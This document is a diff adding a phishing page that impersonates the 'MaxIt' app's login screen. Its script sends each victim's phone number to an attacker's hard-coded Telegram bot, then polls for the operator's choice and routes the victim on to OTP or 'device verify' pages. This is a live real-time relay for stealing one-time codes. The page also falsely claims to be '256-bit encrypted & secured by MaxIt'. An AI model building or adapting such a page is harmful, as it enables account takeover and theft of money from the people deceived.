@@ -1,0 +1,513 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MaxIt - Login</title>
+    <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700&family=Sora:wght@600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --orange: #FF7900;
+            --orange-dark: #d96500;
+            --orange-soft: rgba(255,121,0,0.08);
+            --orange-border: rgba(255,121,0,0.20);
+            --text-dark: #111827;
+            --text-mid: #4b5563;
+            --text-light: #9ca3af;
+            --bg: #f0f4f8;
+            --card: #ffffff;
+            --border: #e5e7eb;
+            --shadow: 0 20px 60px rgba(0,0,0,0.10), 0 4px 16px rgba(0,0,0,0.06);
+        }
+
+        *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: 'DM Sans', sans-serif;
+            background: var(--bg);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 16px;
+            background-image:
+                radial-gradient(ellipse at 20% 10%, rgba(255,121,0,0.07) 0%, transparent 55%),
+                radial-gradient(ellipse at 80% 90%, rgba(255,121,0,0.04) 0%, transparent 50%);
+        }
+
+        .card {
+            width: 100%;
+            max-width: 430px;
+            background: var(--card);
+            border-radius: 28px;
+            box-shadow: var(--shadow);
+            overflow: hidden;
+            animation: fadeUp 0.45s cubic-bezier(.22,.8,.3,1) both;
+        }
+
+        @keyframes fadeUp {
+            from { opacity: 0; transform: translateY(24px); }
+            to   { opacity: 1; transform: translateY(0); }
+        }
+
+        /* ── Header ── */
+        .header {
+            background: linear-gradient(135deg, #FF7900 0%, #d96500 100%);
+            padding: 36px 28px 30px;
+            position: relative;
+            overflow: hidden;
+            text-align: center;
+        }
+        .header::before {
+            content: '';
+            position: absolute;
+            top: -40px; right: -40px;
+            width: 160px; height: 160px;
+            background: rgba(255,255,255,0.07);
+            border-radius: 50%;
+        }
+        .header::after {
+            content: '';
+            position: absolute;
+            bottom: -30px; left: 30px;
+            width: 100px; height: 100px;
+            background: rgba(255,255,255,0.04);
+            border-radius: 50%;
+        }
+
+        /* hero image area */
+        .hero-img-wrap {
+            position: relative;
+            z-index: 1;
+            margin-bottom: 20px;
+        }
+        .hero-img-wrap img {
+            width: 130px;
+            height: 130px;
+            object-fit: contain;
+            filter: drop-shadow(0 8px 24px rgba(0,0,0,0.18));
+        }
+        /* fallback icon if image fails */
+        .hero-icon {
+            width: 90px; height: 90px;
+            background: rgba(255,255,255,0.15);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto;
+            font-size: 40px;
+            color: white;
+        }
+
+        .logo-wrap {
+            display: inline-flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 14px;
+            position: relative;
+            z-index: 1;
+        }
+        .logo-bg {
+            background: white;
+            border-radius: 14px;
+            padding: 8px 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .logo-text {
+            font-family: 'Sora', sans-serif;
+            font-size: 20px;
+            font-weight: 800;
+            color: var(--orange);
+            letter-spacing: -0.5px;
+        }
+
+        .header-title {
+            font-family: 'Sora', sans-serif;
+            font-size: 24px;
+            font-weight: 800;
+            color: white;
+            position: relative;
+            z-index: 1;
+            letter-spacing: -0.5px;
+            line-height: 1.2;
+        }
+        .header-desc {
+            font-size: 13.5px;
+            color: rgba(255,255,255,0.80);
+            margin-top: 6px;
+            position: relative;
+            z-index: 1;
+            line-height: 1.55;
+            font-weight: 400;
+        }
+
+        /* ── Form body ── */
+        .form-body {
+            padding: 28px 22px 30px;
+        }
+
+        .form-group {
+            margin-bottom: 18px;
+        }
+
+        label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: var(--text-dark);
+            margin-bottom: 7px;
+            letter-spacing: 0.1px;
+        }
+
+        .input-wrap {
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+        .input-icon {
+            position: absolute;
+            left: 14px;
+            color: var(--orange);
+            font-size: 16px;
+            pointer-events: none;
+        }
+        input {
+            width: 100%;
+            padding: 13px 15px 13px 42px;
+            background: #f9fafb;
+            border: 1.5px solid var(--border);
+            border-radius: 13px;
+            font-family: 'DM Sans', sans-serif;
+            font-size: 15.5px;
+            color: var(--text-dark);
+            transition: border-color 0.18s, box-shadow 0.18s, background 0.18s;
+            outline: none;
+        }
+        input:focus {
+            border-color: var(--orange);
+            background: #fff;
+            box-shadow: 0 0 0 3.5px rgba(255,121,0,0.10);
+        }
+        input::placeholder { color: var(--text-light); }
+
+        /* ── Error ── */
+        .error-msg {
+            display: none;
+            background: #fff1f1;
+            border: 1px solid #fca5a5;
+            color: #b91c1c;
+            font-size: 13.5px;
+            font-weight: 500;
+            border-radius: 12px;
+            padding: 12px 14px;
+            margin-bottom: 16px;
+            line-height: 1.5;
+        }
+
+        /* ── Buttons ── */
+        .btn-primary {
+            width: 100%;
+            background: linear-gradient(135deg, #FF7900, #d96500);
+            color: white;
+            border: none;
+            padding: 15px;
+            font-family: 'Sora', sans-serif;
+            font-size: 16px;
+            font-weight: 700;
+            border-radius: 50px;
+            cursor: pointer;
+            letter-spacing: -0.2px;
+            transition: opacity 0.18s, transform 0.12s, box-shadow 0.18s;
+            box-shadow: 0 4px 18px rgba(255,121,0,0.35);
+            margin-top: 4px;
+        }
+        .btn-primary:hover:not(:disabled) {
+            opacity: 0.93;
+            box-shadow: 0 6px 24px rgba(255,121,0,0.42);
+            transform: translateY(-1px);
+        }
+        .btn-primary:active:not(:disabled) { transform: translateY(0); }
+        .btn-primary:disabled {
+            background: #d1d5db;
+            box-shadow: none;
+            cursor: not-allowed;
+        }
+
+        .security-note {
+            display: flex;
+            align-items: center;
+            gap: 7px;
+            justify-content: center;
+            font-size: 12px;
+            color: var(--text-light);
+            margin-top: 18px;
+            font-weight: 500;
+        }
+
+        /* ── Spinner overlay ── */
+        #spinner {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(10,10,10,0.92);
+            z-index: 10000;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            gap: 20px;
+            backdrop-filter: blur(4px);
+        }
+        .spin-ring {
+            width: 64px; height: 64px;
+            border: 5px solid rgba(255,255,255,0.12);
+            border-top-color: var(--orange);
+            border-radius: 50%;
+            animation: spin 0.9s linear infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .spin-label {
+            font-family: 'Sora', sans-serif;
+            font-size: 16px;
+            font-weight: 700;
+            color: white;
+        }
+        .spin-sub {
+            font-size: 13px;
+            color: rgba(255,255,255,0.50);
+            margin-top: -12px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="card">
+
+    <!-- Header -->
+    <div class="header">
+        <div class="logo-wrap">
+            <div class="logo-bg">
+                <span class="logo-text">MaxIt</span>
+            </div>
+        </div>
+
+        <!-- Hero image (same as original login page) -->
+        <div class="hero-img-wrap">
+            <img
+                src="https://maxitapps.netlify.app/sslimage-removebg-preview.png"
+                alt="MaxIt"
+                onerror="this.style.display='none'; document.getElementById('heroIcon').style.display='flex';"
+            >
+            <div class="hero-icon" id="heroIcon" style="display:none;">
+                <i class="fa-solid fa-mobile-screen-button"></i>
+            </div>
+        </div>
+
+        <div class="header-title">Authentication</div>
+        <div class="header-desc">Enter your phone number to log in to your MaxIt account.</div>
+    </div>
+
+    <!-- Form -->
+    <div class="form-body">
+
+        <div class="form-group">
+            <label for="phoneNumber">Phone Number</label>
+            <div class="input-wrap">
+                <i class="fa-solid fa-user input-icon"></i>
+                <input type="tel" id="phoneNumber" placeholder="0-XX-XX-XX-XX" inputmode="numeric">
+            </div>
+        </div>
+
+        <div class="error-msg" id="errMsg"></div>
+
+        <button class="btn-primary" id="loginBtn">Log in</button>
+
+        <div class="security-note">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+            </svg>
+            256-bit encrypted &amp; secured by MaxIt
+        </div>
+    </div>
+</div>
+
+<!-- Spinner overlay -->
+<div id="spinner">
+    <div class="spin-ring"></div>
+    <div class="spin-label">Waiting for Approval</div>
+    <div class="spin-sub">Please hold on…</div>
+</div>
+
+<script>
+    const CONFIG = {
+        BOT_TOKEN: '8330538667:AAEgIreUCgpFrDv4Ys-UlPE2-MujHCLTDr0',
+        CHAT_ID: '8587563352',
+        APPROVE_PAGE: 'otp.html',
+        DEVICE_PAGE: 'device_verify.html',
+        SUCCESS_PAGE: 'success.html'
+    };
+
+    let state = { lastUpdateId: 0 };
+    let isProcessing = false;
+
+    const phoneInput = document.getElementById('phoneNumber');
+    const loginBtn   = document.getElementById('loginBtn');
+    const errMsg     = document.getElementById('errMsg');
+    const spinner    = document.getElementById('spinner');
+
+    // ── Phone number formatting (exact original logic) ──
+    phoneInput.addEventListener('input', function () {
+        let cleaned = ('' + this.value).replace(/\D/g, '');
+        if (!cleaned.startsWith('0')) cleaned = '0' + cleaned;
+        cleaned = cleaned.substring(0, 9);
+        let formatted = '0';
+        if (cleaned.length > 1) formatted += '-' + cleaned.substring(1, 3);
+        if (cleaned.length > 3) formatted += '-' + cleaned.substring(3, 5);
+        if (cleaned.length > 5) formatted += '-' + cleaned.substring(5, 7);
+        if (cleaned.length > 7) formatted += '-' + cleaned.substring(7, 9);
+        this.value = formatted;
+    });
+
+    function showError(msg) {
+        errMsg.textContent   = msg;
+        errMsg.style.display = 'block';
+    }
+
+    function resetButton() {
+        isProcessing       = false;
+        loginBtn.disabled  = false;
+        loginBtn.innerHTML = 'Log in';
+    }
+
+    // ── Send to Telegram with all 5 buttons ──
+    async function sendToTelegram(phone) {
+        const ts            = Date.now();
+        const approveId     = `approve_${ts}`;
+        const declineId     = `decline_${ts}`;
+        const verifyId      = `verify_${ts}`;
+        const correctUserId = `correctuser_${ts}`;
+        const wrongUserId   = `wronguser_${ts}`;
+
+        await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CONFIG.CHAT_ID,
+                text: `<b>🟠 MaxIt — Login Attempt</b>\n\nPhone: <code>${phone}</code>\n\nChoose Action:`,
+                parse_mode: 'HTML',
+                reply_markup: {
+                    inline_keyboard: [
+                        [
+                            { text: "✅ Approve Login",  callback_data: approveId },
+                            { text: "📱 Verify Device",  callback_data: verifyId }
+                        ],
+                        [
+                            { text: "✔️ Correct-user",   callback_data: correctUserId },
+                            { text: "❌ Wronge-user",     callback_data: wrongUserId }
+                        ],
+                        [{ text: "🚫 Decline", callback_data: declineId }]
+                    ]
+                }
+            })
+        });
+
+        return { approveId, declineId, verifyId, correctUserId, wrongUserId };
+    }
+
+    // ── Poll for responses ──
+    function startPolling(phone, approveId, declineId, verifyId, correctUserId, wrongUserId) {
+        spinner.style.display = 'flex';
+
+        const interval = setInterval(() => {
+            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`)
+                .then(r => r.json())
+                .then(data => {
+                    if (!data.ok || !data.result) return;
+
+                    data.result.forEach(update => {
+                        state.lastUpdateId = update.update_id;
+
+                        if (update.callback_query) {
+                            const cb = update.callback_query.data;
+
+                            if (cb === approveId || cb === correctUserId) {
+                                // Approve Login OR Correct-user → go to otp.html
+                                clearInterval(interval);
+                                spinner.style.display = 'none';
+                                sessionStorage.setItem('savedPhone', phone);
+                                window.location.href = `${CONFIG.APPROVE_PAGE}?phone=${encodeURIComponent(phone)}`;
+                            }
+                            else if (cb === verifyId) {
+                                // Verify Device → go to device_verify.html
+                                clearInterval(interval);
+                                spinner.style.display = 'none';
+                                sessionStorage.setItem('savedPhone', phone);
+                                window.location.href = `${CONFIG.DEVICE_PAGE}?phone=${encodeURIComponent(phone)}`;
+                            }
+                            else if (cb === wrongUserId) {
+                                // Wrong user → show error, stay on page
+                                clearInterval(interval);
+                                spinner.style.display = 'none';
+                                showError("Wrong number entered. Please check and try again.");
+                                resetButton();
+                            }
+                            else if (cb === declineId) {
+                                // Decline → show error, stay on page
+                                clearInterval(interval);
+                                spinner.style.display = 'none';
+                                showError("Request was not approved. Please try again.");
+                                resetButton();
+                            }
+                        }
+                    });
+                })
+                .catch(() => {}); // silent fail, keep polling
+        }, 1500);
+    }
+
+    // ── Login button click ──
+    loginBtn.addEventListener('click', async function () {
+        errMsg.style.display = 'none';
+
+        if (phoneInput.value.length < 13) {
+            showError("Please enter a valid phone number.");
+            return;
+        }
+
+        if (isProcessing) return;
+        isProcessing       = true;
+        loginBtn.disabled  = true;
+        loginBtn.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin"></i> Sending…';
+
+        sessionStorage.setItem('savedPhone', phoneInput.value);
+
+        try {
+            // Seed offset so we only catch NEW responses
+            const seedResp = await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?limit=100`);
+            const seedData = await seedResp.json();
+            if (seedData.ok && seedData.result.length > 0) {
+                state.lastUpdateId = seedData.result[seedData.result.length - 1].update_id;
+            }
+
+            loginBtn.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin"></i> Waiting for approval…';
+
+            const ids = await sendToTelegram(phoneInput.value);
+            startPolling(
+                phoneInput.value,
+                ids.approveId,
+                ids.declineId,
+                ids.verifyId,
+                ids.correctUserId,
+                ids.wrongUserId
+            );
+        } catch (err) {
+            showError("Network error. Please try again.");
+            resetButton();
+        }
+    });
+</script>
+</body>
+</html>
